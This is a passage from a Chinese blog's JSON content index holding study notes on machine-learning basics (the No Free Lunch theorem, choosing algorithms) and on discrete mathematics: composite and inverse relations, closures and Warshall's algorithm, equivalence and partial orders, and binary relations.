对于NFL定理中提及的先验分布而言，我们可以用如下例子进行理解： 其中空间上距离接近的样本它们属于同一个类别的概论更高就是一种先验分布，这就意味着机器学习算法是基于某些先验分布来进行预测的学科。 这就意味着在学习过程中，我们不能片面夸大某个定理的作用，要对开发新的算法保持探索的精神。 此外该定理还提醒了我们机器学习的本质：基于有限的已知数据，在复杂的高维特征空间中预测未知样本的属性和类别 如何选用合适的算法 选用机器学习算法需要考虑以下几个问题： 使用机器学习算法的目的 想要完成的任务 了解数据的特征 首先考虑机器学习算法的目的以及想要完成的任务： 如果要预测目标变量的值，则可以选择监督学习算法； 否则可以选择无监督学习算法。 确定选择监督学习算法后，需要进一步明确目标变量的类型： 如果目标变量是离散型，则可以选择分类算法； 如果是连续性，则可以使用回归算法 其次需要考虑实际的数据，应该充分了解数据，对数据了解的越充分，越容易创建符合实际需要的应用程序，主要应该了解数据的以下几个特征： 特征值是离散型变量还是连续型变量 特征值中是否有缺失的值，何种原因造成 数据中是否有异常值 某些特征发生的频率如何 通过对数据的充分了解，可以帮助我们缩小算法的选择范围，而由NFL定理可以知道，一般并不存在最好的算法和可以给出最好效果的算法，一般发现最好算法的关键环节就是反复调试和迭代 开发机器学习应用程序的步骤 收集数据：通过多种手段收集数据，比如爬虫等，也可以使用开源数据源 准备输入数据： 得到数据之后，还必须确保数据格式符合要求，使用标准的数据格式可以融合算法和数据源，方便匹配操作 还要为机器学习算法准备特定的数据格式，一般某些算法要求目标变量和特征值是字符串，而另一些算法要求是整型 分析输入数据：主要是人工分析得到的数据，确保数据中没有垃圾数据 训练算法：将前两步得到的格式化数据输入到算法，从中抽取信息 测试算法： 对于监督学习，必须已知用于评估算法的目标变量值 对于非监督学习，也必须用其他评测手段来检验算法的成功率 如果不满意算法的输出结果，不改变算法的前提下，问题常常与数据的收集和准备有关 使用算法：将机器学习算法转化为应用程序，执行实际任务，以检验上述步骤是否可以在实际环境中运行","categories":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"http://enderxiao.github.io/categories/Machine-Learning/"},{"name":"机器学习入门","slug":"Machine-Learning/机器学习入门","permalink":"http://enderxiao.github.io/categories/Machine-Learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"http://enderxiao.github.io/tags/Machine-Learning/"}]},{"title":"离散数学-复合关系与逆关系","slug":"离散数学-复合关系与逆关系","date":"2021-03-14T13:50:48.000Z","updated":"2024-07-30T11:26:33.937Z","comments":true,"path":"2021/03/14/离散数学-复合关系与逆关系/","permalink":"http://enderxiao.github.io/2021/03/14/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E5%A4%8D%E5%90%88%E5%85%B3%E7%B3%BB%E4%B8%8E%E9%80%86%E5%85%B3%E7%B3%BB/","excerpt":"","text":"复合关系 定义 设R是集合A到B的二元关系，S是集合B到C的二元关系，R和S的复合记作：R∘SR \\circ SR∘S，它是集合A到C的二元关系，仅当(a,b)∈R( a,b) \\in R(a,b)∈R且(b,c)∈R(b,c) \\in R(b,c)∈R时，(a,c)∈R∘S(a,c) \\in R \\circ S(a,c)∈R∘S。 复合关系的矩阵表示 表示方法 设A={a1,a2,a3,...,an},B={b1,b2,b3,...,bm},C={c1,c2,c3,...,cp}A = \\{a_1,a_2,a_3,...,a_n\\}, B = \\{b_1,b_2,b_3,...,b_m\\},C = \\{c_1,c_2,c_3,...,c_p\\}A={a1​,a2​,a3​,...,an​},B={b1​,b2​,b3​,...,bm​},C={c1​,c2​,c3​,...,cp​},R时A到B的二元关系,R的关系矩阵为： MR=[x11x12⋯x1mx21x22⋯x2m⋮⋮⋱⋮xn1xn2⋯xnm]M_R = \\begin{bmatrix} x_{11} &amp; x_{12} &amp; \\cdots &amp; x_{1m} \\\\\\\\ x_{21} &amp; x_{22} &amp; \\cdots &amp; x_{2m} \\\\\\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\\\\\ x_{n1} &amp; x_{n2} &amp; \\cdots &amp; x_{nm} \\\\\\\\ \\end{bmatrix} MR​=⎣⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎡​x11​x21​⋮xn1​​x12​x22​⋮xn2​​⋯⋯⋱⋯​x1m​x2m​⋮xnm​​⎦⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎤​ 其中： xij={1(ai,bj)∈R0(ai,bj)∉Rx_{ij} = \\begin{cases} 1 &amp; (a_i,b_j)\\in R \\\\\\\\ 0 &amp; (a_i,b_j) \\notin R \\end{cases} xij​=⎩⎪⎪⎨⎪⎪⎧​10​(ai​,bj​)∈R(ai​,bj​)∈/R​ S是B到C的二元关系，S的关系矩阵为： Ms=[y11y12⋯y1py21y22⋯y2p⋮⋮⋱⋮ym1ym2⋯ymp]M_s = \\begin{bmatrix} y_{11} &amp; y_{12} &amp; \\cdots &amp; y_{1p} \\\\\\\\ y_{21} &amp; y_{22} &amp; \\cdots &amp; y_{2p} \\\\\\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\\\\\ y_{m1} &amp; y_{m2} &amp; \\cdots &amp; y_{mp} \\\\\\\\ \\end{bmatrix} Ms​=⎣⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎡​y11​y21​⋮ym1​​y12​y22​⋮ym2​​⋯⋯⋱⋯​y1p​y2p​⋮ymp​​⎦⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎤​ 令MR×MS=[zij]M_R\\times M_S = [z_{ij}]MR​×MS​=[zij​]，即有： MR×MS=[z11z12⋯z1pz21z22⋯z2p⋮⋮⋱⋮zn1zn2⋯znp]M_R \\times M_S = \\begin{bmatrix} z_{11} &amp; z_{12} &amp; \\cdots &amp; z_{1p} \\\\\\\\ z_{21} &amp; z_{22} &amp; \\cdots &amp; z_{2p} \\\\\\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\\\\\ z_{n1} &amp; z_{n2} &amp; \\cdots &amp; z_{np} \\\\\\\\ \\end{bmatrix} MR​×MS​=⎣⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎡​z11​z21​⋮zn1​​z12​z22​⋮zn2​​⋯⋯⋱⋯​z1p​z2p​⋮znp​​⎦⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎤​ 由矩阵乘法规则的： zij=xi1×y1j+xi2×y2j+⋯+xim×ymj=∑k=1mxik×ykjz_{ij} = x_{i1}\\times y_{1j} + x_{i2}\\times y_{2j}+ \\dots + x_{im} \\times y_{mj} = \\sum\\limits_{k = 1}^m x_{ik} \\times y_{kj} zij​=xi1​×y1j​+xi2​×y2j​+⋯+xim​×ymj​=k=1∑m​xik​×ykj​ 对于式中的xik×yikx_{ik}\\times y_{ik}xik​×yik​，当且仅当，xik,ykjx_{ik},y_{kj}xik​,ykj​同时为1时，计算结果才为1。又由于只有当(a_i,b_k) \\in R \\and (b_k,c_j) \\in S时，才有x_{ik} \\neq 0 \\and y_{kj} \\neq 0，故，由复合运算的定义可得，此时的R∘SR \\circ SR∘S中应该包含(ai,cj)(a_{i},c_{j})(ai​,cj​)，即zij≠0z_{ij} \\neq 0zij​=0。 故以此法就能通过矩阵乘法去确定一个复合关系的关系矩阵，而在计算矩阵乘法的过程中，我们只关注∑k=1mxik×ykj\\sum\\limits_{k = 1}^m x_{ik} \\times y_{kj}k=1∑m​xik​×ykj​中是否有1出现，故我们可以将此处的加法替换为布尔加（即 0+0 = 0，1+0 = 0+1 = 1，1+1 = 1），这样在编程实现中，就能使用与运算来代替10进制的加法运算，众所周知，代码的世界里，位运算要比10进制运算来的快。 我们用MR∘MSM_R \\circ M_SMR​∘MS​来表示使用布尔加的矩阵乘法，于是可以得到如下定理 定理4.1：设R时A到B的二元关系，其关系矩阵为MRM_RMR​，S时B到C的二元关系，其关系矩阵为MSM_SMS​，则MR∘S=MR∘MSM_{R \\circ S} = M_R \\circ M_SMR∘S​=MR​∘MS​ 特征 复合关系具有如下特征： 满足结合律 Ri∘Rj=Ri+jR^i \\circ R^j = R^{i+j}Ri∘Rj=Ri+j（i,j为正整数）；R0R^0R0定义为{(a1,b1),(a2,b2),…,(an,bn)}\\{(a_1,b_1),(a_2,b_2),\\dots ,(a_n,b_n)\\}{(a1​,b1​),(a2​,b2​),…,(an​,bn​)}，即关系矩阵为单位矩阵 逆关系 定义 设R是A到B的二元关系，如果把R中的每一个有序对中的元素顺序互换，所得B到A的二元关系称为R的逆关系，记作R−1R^{-1}R−1或R~\\tilde{R}R~ 矩阵表示 若二元关系R的的关系矩阵为MRM _RMR​，则MRM_RMR​的转置MRTM_{R}^TMRT​，就是关系R−1R^{-1}R−1的关系矩阵 特征 有矩阵转置的运算规则可知： (A×B)T=BT×AT(A \\times B)^T = B^T \\times A^T(A×B)T=BT×AT 由此可得以下定理 定理4.2：设R是A到B的二元关系，S是B到C的二元关系，则(R∘S)−1=S−1∘R−1(R \\circ S)^{-1} = S^{-1}\\circ R^{-1}(R∘S)−1=S−1∘R−1 定理4.3： 设R是A上的二元关系，R−1R^{-1}R−1 是其逆关系，于是有：若R是 1. 自反的 2. 反自反的 3. 对称的 4. 反对称的 5. 可传递的 则R−1R^{-1}R−1也是 关系的闭包运算 闭包运算的定义 在给定的二元关系中，添加最少量的有序对后，使其称为自反的，或对称的，或传递的二元关系，则这样的操作称为关系的闭包运算 自反、对称、传递闭包 设R是A上的二元关系，R的自反（对称、传递）闭包R′R&#x27;R′也是A上的二元关系，且满足： R′R&#x27;R′是自反的（对称的，传递的） R′⊇RR&#x27; \\supseteq RR′⊇R 对于任何A上的自反的（对称的、传递的）二元关系R′′R&#x27;&#x27;R′′，如果R′′⊇RR&#x27;&#x27; \\supseteq RR′′⊇R，则必有R′′⊇R′R&#x27;&#x27;\\supseteq R&#x27;R′′⊇R′ 通常R的自反闭包记作r®，对称闭包记作s®，传递闭包记作t® 求闭包 对于自反闭包和对称闭包，通过简单的添加“缺啥补啥”的原则即可求出 但在求传递闭包时，补充的元素可能会和已有的元素再次构成隐含的传递关系，那么处理起来就比较麻烦，下面介绍Warchall提出的求传递闭包的算法： 置矩阵M=MRM = M_RM=MR​（MRM_RMR​ 是关系矩阵） 置 j = 1 对所有i，如果mij=1m_{ij} = 1mij​=1，则对k=1,2,…,nk = 1,2,\\dots,nk=1,2,…,n，置mik=mik+mjkm_{ik} = m_{ik} + m_{jk}mik​=mik​+mjk​，即把第j行加到第i行 j = j + 1 如果$ j \\leq n$，则跳转到步骤3，否则停止","categories":[{"name":"离散数学","slug":"离散数学","permalink":"http://enderxiao.github.io/categories/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"},{"name":"研究生入学考试","slug":"研究生入学考试","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E5%85%A5%E5%AD%A6%E8%80%83%E8%AF%95/"},{"name":"复试","slug":"研究生入学考试/复试","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E5%85%A5%E5%AD%A6%E8%80%83%E8%AF%95/%E5%A4%8D%E8%AF%95/"}],"tags":[{"name":"离散数学","slug":"离散数学","permalink":"http://enderxiao.github.io/tags/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"},{"name":"复合关系关系","slug":"复合关系关系","permalink":"http://enderxiao.github.io/tags/%E5%A4%8D%E5%90%88%E5%85%B3%E7%B3%BB%E5%85%B3%E7%B3%BB/"},{"name":"逆关系","slug":"逆关系","permalink":"http://enderxiao.github.io/tags/%E9%80%86%E5%85%B3%E7%B3%BB/"}]},{"title":"离散数学-等价关系与偏序关系","slug":"离散数学-等价关系与偏序关系","date":"2021-03-14T08:32:19.000Z","updated":"2024-07-30T11:26:33.937Z","comments":true,"path":"2021/03/14/离散数学-等价关系与偏序关系/","permalink":"http://enderxiao.github.io/2021/03/14/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E7%AD%89%E4%BB%B7%E5%85%B3%E7%B3%BB%E4%B8%8E%E5%81%8F%E5%BA%8F%E5%85%B3%E7%B3%BB/","excerpt":"","text":"等价关系 定义 设存在关系R，若R满足： R是A上的二元关系 R是自反、对称、传递关系 则，R为A上的等价关系。 例子 如果同年龄的大学生认为是相关的，不同年龄的大学生是无关的，则这种年龄关系R是等价关系 如果姓氏相同的的大学生认为是相关的，不同姓氏的大学生是无关的，则这种姓氏关系R是等价关系 综上，若对于一个集合A种的元素，按某种条件进行分组，并使得： A种每个元素必属于某一组且仅属于一组 定义同一组内的元素相关，不同一组内的元素无关 则定义的二元关系必然是等价关系 特征 若把A中的元素按“组”顺序排列，那么等价关系R的关系矩阵是由若干个元素全为1的小方阵构成 等价类和商集 定义 等价类 设R是A商的等价关系，a是A中的任意元素，由A中所有与a相关的元素组成的集合，称为a关于R的等价类，记作[a]R[a]_R[a]R​ 商集 设R是A上的等价关系，由关于R的所有不同的等价类作为元素构成的集合称为A关于R的商集，记作A/R 集合划分 定义 设A是集合，A1,A2,…,AnA_1 , A_2 , \\dots , A_nA1​,A2​,…,An​ 是A的非空子集，且满足： A1∪A2∪⋯∪An=AA_1 \\cup A_2 \\cup \\dots \\cup A_n = AA1​∪A2​∪⋯∪An​=A Ai∩Aj=∅(i≠j,i,j=1,2,3,…,n)A_i \\cap A_j = \\emptyset(i \\neq j,i,j = 1,2,3,\\dots,n)Ai​∩Aj​=∅(i=j,i,j=1,2,3,…,n) 则以A1,A2,…,AnA_1 , A_2 , \\dots , A_nA1​,A2​,…,An​作为元素构成的集合S称为集合A的划分，每个子集AiA_iAi​称为块 等价类、商集与集合划分 当R是A上的等价关系时，A关于R的商集时A的一个划分，等价类就是块 于是有定理： 定理3.1：集合A的划分能唯一地确定A上的一个等价关系；反之，确定了A上的等价关系也能唯一地确定A的一个划分，即A上的等价关系与划分一一对应 集合运算的等价关系 设R1R_1R1​ 和 R2R_2R2​ 时非空集合A上的等价关系，则 R1∪R2R_1 \\cup R_2R1​∪R2​ 一定不是等价关系 R1∩R2R_1 \\cap R_2R1​∩R2​ 一定是等价关系 R1−R2R_1 - R_2R1​−R2​ 一定不是等价关系 R1⊕R2R_1 \\oplus R_2R1​⊕R2​ 一定不是等价关系 可通过定义法，验证是否满足转递、自反、对称关系证明 偏序关系 定义 设有关系R，集合A，若R满足： R是A上的二元关系 R是自反，反对称，传递关系 则R是A上的偏序关系(半序关系) 例子 对于正整数集，Z+\\mathbb{Z}^+Z+,R是其上的小于等于关系关系，即当a≤ba \\leq ba≤b时，(a,b)∈R(a,b) \\in R(a,b)∈R，则R是其上的偏序关系 对于正整数集，Z+\\mathbb{Z}^+Z+,R是其上的整除关系，即当b mod a=0b \\ mod \\ a = 0b mod a=0时，(a,b)∈R(a,b) \\in R(a,b)∈R，则R是其上的偏序关系 通常把集合A和集合A上的偏序关系R合在一起称为偏序集，并记作（A,R）或（A,⪯\\preceq⪯） 偏序关系哈斯图表示 由偏序关系的特征： 每个顶点都有自回，则可省略所有自环 对于(a,b)∈R(a,b) \\in R(a,b)∈R和(b,c)∈R(b,c)\\in R(b,c)∈R时，必有(a,c)∈R(a,c) \\in R(a,c)∈R，则可省略a到c的边 通过调整点的位置，可以使所有有向边全部朝上，则可省略有向边的箭头 例子 如设A = {1,2,3,4,5,6,12},R时A上的整除关系。易知，R = {(1,1),(2,2),(3,3),(4,4),(6,6),(12,12),(1,2),(1,3),(1,4),(1,6),(1,12),(2,4),(2,6),(2,12),(3,6),(3,12),(4,12),(6,12)} 则使用有向图表示为： 使用哈斯图表示为： 覆盖 设A(A,⪯\\preceq⪯)是偏序集，a和b是A种两个不同的元素，如果a⪯ba\\preceq ba⪯b，且在A中不存在其他元素c，使得a⪯c,c⪯ba\\preceq c,c\\preceq ba⪯c,c⪯b，则称b覆盖a 作图原则 利用覆盖的概念，可以油邻接矩阵直接画出哈斯图，即： 当b覆盖a时，代表b的顶点应华仔代表a的顶点上复，并用直线段连接这两个顶点 偏序集中的特殊元素 设A(A,⪯\\preceq⪯)是偏序集，A中存在元素a 极小元： A中没有其他元素x满足x⪯ax\\preceq ax⪯a，则a为A中的极小元 即a再也不能覆盖A中其他元素时，a时极小元 极大元： A中没有其他元素x满足x⪰ax\\succeq ax⪰a，则a为A中的极小元 即A中没有其他元素能覆盖a时，a为极大元 最小元： 中任何元素x，都有x⪰ax\\succeq ax⪰a，则a为A中的最小元 即能被所有覆盖 最大元： A中任何元素x，都有x⪯ax\\preceq ax⪯a，则a为A中的最大元 即能覆盖所有 上界：设B是A的子集，如果B中任何元素x，都有x⪯ax\\preceq ax⪯a,则称a为子集B的上界 下界：设B是A的子集，如果B中任何元素x，都有a⪯xa\\preceq xa⪯x,则称a为子集B的下界 上确界： 设B是A的子集，a是B的上界，若B中任何上界x，都有a⪯xa\\preceq xa⪯x，则称a为子集B的上确界 即最小上界 下确界： 设B是A的子集，a是B的上界，若B中任何上界x，都有x⪯ax \\preceq ax⪯a，则称a为子集B的下确界 即最大下界 全序集和拟序集 全序集 定义 设A(A,⪯\\preceq⪯)是偏序集，如果A中任意两个元素都是可比的（即任意两个元素都有关系），则称⪯\\preceq⪯为全序关系，(A,⪯)(A,\\preceq)(A,⪯)为全序集 例子 如Z+Z^+Z+是正整数集合，对于先于等于关系，(Z+,⪯)(Z^+,\\preceq)(Z+,⪯)是全序集下 拟序集 定义 设R是A上的一个二元关系，若满足： R是反自反关系 R是传递关系 则R为A上的拟序关系，A为拟序集 例子 如ZZZ上的小于关系是拟序关系 相关定理 拟序关系有如下定理： 定理3.2：设R是A上的拟序关系，则R是A上的反对称关系","categories":[{"name":"离散数学","slug":"离散数学","permalink":"http://enderxiao.github.io/categories/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"},{"name":"研究生入学考试","slug":"研究生入学考试","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E5%85%A5%E5%AD%A6%E8%80%83%E8%AF%95/"},{"name":"复试","slug":"研究生入学考试/复试","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E5%85%A5%E5%AD%A6%E8%80%83%E8%AF%95/%E5%A4%8D%E8%AF%95/"}],"tags":[{"name":"离散数学","slug":"离散数学","permalink":"http://enderxiao.github.io/tags/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/"},{"name":"等价关系","slug":"等价关系","permalink":"http://enderxiao.github.io/tags/%E7%AD%89%E4%BB%B7%E5%85%B3%E7%B3%BB/"},{"name":"偏序关系","slug":"偏序关系","permalink":"http://enderxiao.github.io/tags/%E5%81%8F%E5%BA%8F%E5%85%B3%E7%B3%BB/"}]},{"title":"离散数学-二元关系与函数","slug":"离散数学-二元关系与函数","date":"2021-02-28T14:04:49.000Z","updated":"2024-07-30T11:26:33.937Z","comments":true,"path":"2021/02/28/离散数学-二元关系与函数/","permalink":"http://enderxiao.github.io/2021/02/28/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6-%E4%BA%8C%E5%85%83%E5%85%B3%E7%B3%BB%E4%B8%8E%E5%87%BD%E6%95%B0/","excerpt":"","text":"二元关系基本概念 二元关系定义 设存在集合A={a,b,c,d,e}设存在集合A=\\{a,b,c,d,e\\} 设存在集合A={a,b,c,d,e} 若存在集合形如R={(a,b),(b,c),(b,d),(d,e)}的仅由A中两个元素组成的集合，称为二元关系若存在集合形如R=\\{(a,b),(b,c),(b,d),(d,e)\\}的仅由A中两个元素组成的集合，称为二元关系 若存在集合形如R={(a,b),(b,c),(b,d),(d,e)}的仅由A中两个元素组成的集合，称为二元关系 笛卡尔积 笛卡尔积，又称直积 定义 设A、B是集合,A到B的笛卡尔积用A×BA\\times BA×B表示，A×BA\\times BA×B为所有以形如（a,b）的有序对为元素的集合，其中a∈A,b∈Ba \\in A,b\\in Ba∈A,b∈B 当B = A时，A×AA\\times AA×A称为集合A上的笛卡尔乘积 例子 A={a,b,c},B={x,y}A = \\{a,b,c\\},B = \\{x,y\\}A={a,b,c},B={x,y} 则A×B={(a,x),(a,y),(b,x),(b,y),(c,x),(c,y)}则A\\times B = \\{(a,x),(a,y),(b,x),(b,y),(c,x),(c,y)\\}则A×B={(a,x),(a,y),(b,x),(b,y),(c,x),(c,y)} 笛卡尔积元素个数 由笛卡尔积的性质可知，若确定了某个集合A和B，则A×BA\\times BA×B中的元素个数时可确定的。 接下来讨论元素个数的特点 若∣A∣=n,∣B∣=m|A| = n,|B| = m∣A∣=n,∣B∣=m A中任意一个元素a都能与B中的每一个元素组成一个元组，则可以组成m个 则∣A×B∣=n×m|A\\times B| = n\\times m∣A×B∣=n×m 笛卡尔积相关定义 二元关系 设A、B是集合，R是笛卡尔乘积A×B的子集，则称R是A到B的一个二元关系设A、B是集合，R是笛卡尔乘积A\\times B的子集，则称R是A到B的一个二元关系设A、B是集合，R是笛卡尔乘积A×B的子集，则称R是A到B的一个二元关系 若B=A，R是笛卡尔乘积A×B的子集，称R是A上的一个二元关系若B = A，R是笛卡尔乘积A\\times B的子集，称R是A上的一个二元关系若B=A，R是笛卡尔乘积A×B的子集，称R是A上的一个二元关系 前域与值域 设R是二元关系，由(x,y)∈R的所有x组成的集合称为R的前域记作domR设R是二元关系，由(x,y)\\in R的所有x组成的集合称为R的前域记作domR设R是二元关系，由(x,y)∈R的所有x组成的集合称为R的前域记作domR 所有y组成的集合称为R的值域，记作ranR所有y组成的集合称为R的值域，记作ranR所有y组成的集合称为R的值域，记作ranR 平凡子集 对于集合A，空集和集合A本身一定是A的子集，则成这两个集合为A的平凡子集 笛卡尔积的平凡子集 对于A和B的笛卡尔乘积A×BA\\times BA×B，∅和A×B\\emptyset和A\\times B∅和A×B分别称为空关系和全域关系 二元关系表示法 表格表示法 前域为行，值域为列 如： A={a1,a2,a3,a4,a5}A = \\{a_1,a_2,a_3,a_4,a_5\\}A={a1​,a2​,a3​,a4​,a5​} B={b1,b2,b3,b4}B = \\{b_1,b_2,b_3,b_4\\}B={b1​,b2​,b3​,b4​} R={(a1,b1),(a1,b2),(a3,b3),(a4,b4),(a5,b3)}R = \\{(a_1,b_1),(a_1,b_2),(a_3,b_3),(a_4,b_4),(a_5,b_3)\\}R={(a1​,b1​),(a1​,b2​),(a3​,b3​),(a4​,b4​),(a5​,b3​)} 则R可表示为 b1 b2 b3 b4 a1 √ √ a2 a3 √ a4 √ a5 √ 矩阵表示法 设∣A∣=n,∣B∣=m|A| = n,|B| = m∣A∣=n,∣B∣=m,则可以用一个n×mn\\times mn×m的矩阵C来表示关系二元关系R 即将C中元素CijC_{ij}Cij​定义为： {1(ai,bj)∈R0(ai,bj)∉R\\begin{cases} 1 &amp; (a_i,b_j)\\in R \\\\\\\\ 0 &amp; (a_i,b_j) \\notin R \\end{cases} ⎩⎪⎪⎨⎪⎪⎧​10​(ai​,bj​)∈R(ai​,bj​)∈/R​ 则，矩阵 C=[100011001010001]C = \\begin{bmatrix} 1 &amp; 0 &amp; 0 \\\\\\\\ 0 &amp; 1 &amp; 1 \\\\\\\\ 0 &amp; 0 &amp; 1 \\\\\\\\ 0 &amp; 1 &amp; 0 \\\\\\\\ 0 &amp; 0 &amp; 1 \\\\\\\\ \\end{bmatrix} C=⎣⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎡​10000​01010​01101​⎦⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎤​ 则C称为R的关系矩阵 图形表示法 对于R中的所有关系，分别用n个点表示A中的所有元素，m个点表示B中的所有元素，若a∈A,b∈B,(a,b)∈Ra\\in A,b \\in B,(a,b) \\in Ra∈A,b∈B,(a,b)∈R,则从点a至b画一条有向边 若R是A上的二元关系，则可以只用n个点表示A中的所有元素，若(ai,aj)∈R(a_i,a_j) \\in R(ai​,aj​)∈R,则从点aia_iai​到点aja_jaj​画一条有向边 二元关系的基本类型 基本类型 定义 特征 自反 设R是A上的一个二元关系，如果对于A中每一个元素a，都有(a,a)∈R(a,a) \\in R(a,a)∈R，则称R为自反的二元关系 R的关系矩阵中的主对角线元素均为1 反自反 设R是A上的二元关系，如果对于A中每一个元素a，都有(a,a)∉R(a,a) \\notin R(a,a)∈/R，则称R为反自反的二元关系 R的关系矩阵中主对角线元素均为0 对称 设R是A上的二元关系，且每当(a,b)∈R(a,b)\\in R(a,b)∈R时，就一定有(b,a)∈R(b,a)\\in R(b,a)∈R，则称R为对称的二元关系 R的关系矩阵是一个对称的方阵 反对称 设R是A上的二元关系，每当(a,b)∈R(a,b)\\in R(a,b)∈R，且(b,a)∈R(b,a) \\in R(b,a)∈R时，必有a = b，则称R为反对称的二元关系 R的关系矩阵中以主对角线对称的两个元素不能同时为1 传递 设R是A上的二元关系，每当有(a,b)∈R(a,b)\\in R(a,b)∈R且(b,c)∈R(b,c) \\in R(b,c)∈R时，必有(a,c)∈R(a,c) \\in R(a,c)∈R，则称R为传递的二元关系 可以通过矩阵乘法判断是否传递 传递性的判断 判断关系R是否为传递的二元关系时，需要利用矩阵乘法，下面进行分析 设A=a1,a2,...,a3,R时A上的二元关系，R的关系矩阵AR为设A = {a_1,a_2,...,a_3},R时A上的二元关系，R的关系矩阵A_R为 设A=a1​,a2​,...,a3​,R时A上的二元关系，R的关系矩阵AR​为 AR=[a11a12⋯a1na21a22⋯a2n⋮⋮⋱⋮an1an2⋯ann]A_R = \\begin{bmatrix} a_{11} &amp; a_{12} &amp; \\cdots &amp; a_{1n} \\\\\\\\ a_{21} &amp; a_{22} &amp; \\cdots &amp; a_{2n} \\\\\\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\\\\\ a_{n1} &amp; a_{n2} &amp; \\cdots &amp; a_{nn} \\\\\\\\ \\end{bmatrix} AR​=⎣⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎡​a11​a21​⋮an1​​a12​a22​⋮an2​​⋯⋯⋱⋯​a1n​a2n​⋮ann​​⎦⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎤​ 其中 aij={1(ai,bj)∈R0(ai,bj)∉Ra_{ij} = \\begin{cases} 1 &amp; (a_i,b_j)\\in R \\\\\\\\ 0 &amp; (a_i,b_j) \\notin R \\end{cases} aij​=⎩⎪⎪⎨⎪⎪⎧​10​(ai​,bj​)∈R(ai​,bj​)∈/R​ 令B=AR×AR,BB = A_R \\times A_R, BB=AR​×AR​,B中的元素为bijb_{ij}bij​,即有 B=[b11b12⋯b1nb21b22⋯b2n⋮⋮⋱⋮bn1bn2⋯bnn]=[a11a12⋯a1na21a22⋯a2n⋮⋮⋱⋮an1an2⋯ann]×[a11a12⋯a1na21a22⋯a2n⋮⋮⋱⋮an1an2⋯ann]B = \\begin{bmatrix} b_{11} &amp; b_{12} &amp; \\cdots &amp; b_{1n} \\\\\\\\ b_{21} &amp; b_{22} &amp; \\cdots &amp; b_{2n} \\\\\\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\\\\\ b_{n1} &amp; b_{n2} &amp; \\cdots &amp; b_{nn} \\\\\\\\ \\end{bmatrix} = \\begin{bmatrix} a_{11} &amp; a_{12} &amp; \\cdots &amp; a_{1n} \\\\\\\\ a_{21} &amp; a_{22} &amp; \\cdots &amp; a_{2n} \\\\\\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\\\\\ a_{n1} &amp; a_{n2} &amp; \\cdots &amp; a_{nn} \\\\\\\\ \\end{bmatrix}\\times \\begin{bmatrix} a_{11} &amp; a_{12} &amp; \\cdots &amp; a_{1n} \\\\\\\\ a_{21} &amp; a_{22} &amp; \\cdots &amp; a_{2n} \\\\\\\\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\\\\\ a_{n1} &amp; a_{n2} &amp; \\cdots &amp; a_{nn} \\\\\\\\ \\end{bmatrix} B=⎣⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎡​b11​b21​⋮bn1​​b12​b22​⋮bn2​​⋯⋯⋱⋯​b1n​b2n​⋮bnn​​⎦⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎤​=⎣⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎡​a11​a21​⋮an1​​a12​a22​⋮an2​​⋯⋯⋱⋯​a1n​a2n​⋮ann​​⎦⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎤​×⎣⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎢⎡​a11​a21​⋮an1​​a12​a22​⋮an2​​⋯⋯⋱⋯​a1n​a2n​⋮ann​​⎦⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎥⎤​ 由矩阵乘法运算规则可知 bij=ai1×a1j+ai2×a2j+⋯+ain×anj=∑R=1naik×akjb_{ij} = a_{i1} \\times a_{1j} + a_{i2}\\times a_{2j} + \\cdots +a_{in}\\times a_{nj} = \\sum\\limits_{R = 1}^n a_{ik} \\times a_{kj} bij​=ai1​×a1j​+ai2​×a2j​+⋯+ain​×anj​=R=1∑n​aik​×akj​ 即，当bij≠0b_{ij} \\neq 0bij​=0时，说明，存在一个k≤nk\\leq nk≤n,其对应的一组aik=akj=1a_{ik}=a_{kj}=1aik​=akj​=1，即(aik,ajk)∈R(a_{ik},a{jk})\\in R(aik​,ajk)∈R，那么如果R为传递关系，则必须有aij=1a_{ij} = 1aij​=1，故对于任意bij≠0b_{ij} \\neq 0bij​=0都有aij=1a_{ij} = 